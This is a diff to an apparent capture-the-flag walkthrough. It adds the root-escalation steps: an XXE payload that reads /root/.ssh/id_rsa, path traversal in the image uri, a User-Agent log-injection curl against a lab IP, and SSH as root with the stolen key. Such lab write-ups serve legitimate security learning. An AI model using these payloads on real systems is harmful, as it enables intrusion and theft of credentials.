@@ -211,6 +211,31 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 	* Now that I know the Java app will be looking for `hackerfox_creds.xml` in the home directory, I can create that with a previously downloaded export.xml file
 	* I added the XXE payload from hacktricks and changed the `ENTITY` to `hackerfox` and the `SYSTEM` to `"file:///root/.ssh/id_rsa"`
 	* I also changed the uri to `/../../../../../../home/woodenk`
-* Then plant the agent string in the log file: ````
+	* Finally, I added the hello parameters for the output of the file
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY hackerfox SYSTEM "file:///root/.ssh/id_rsa"> ]>
+<credits>
+  <author>woodenk</author>
+  <image>
+          <uri>/../../../../../../home/woodenk/greg.jpg</uri>
+          <hello>&hackerfox;</hello>
+    <views>4</views>
+  </image>
+  <totalviews>4</totalviews>
+</credits>
+
+```
+* I then put my `greg.jpg` and `hackerfox_creds.xml` onto the box with my webserver in the home directory
+* I then planted the agent string in the log file: ````
 curl -i -s -k -X POST --data-binary 'name=hackerfox' 'http://10.129.227.207:8080/search' -A "||/../../../../../../../home/woodenk/greg.jpg"`
-* make s
+* make sure the curl shows up in the logs
+* Now export with a curl request to trigger the XXE
+```bash
+curl http://10.129.227.207:8080/export.xml?author=woodenk
+```
+* Go to the xml file after a minute or two and the private key should be there
+* Use the key to ssh into the box as root from host
+	* make sure you `chmod 600` or it will get mad at you
+* `cat` the root flag. Yippee!
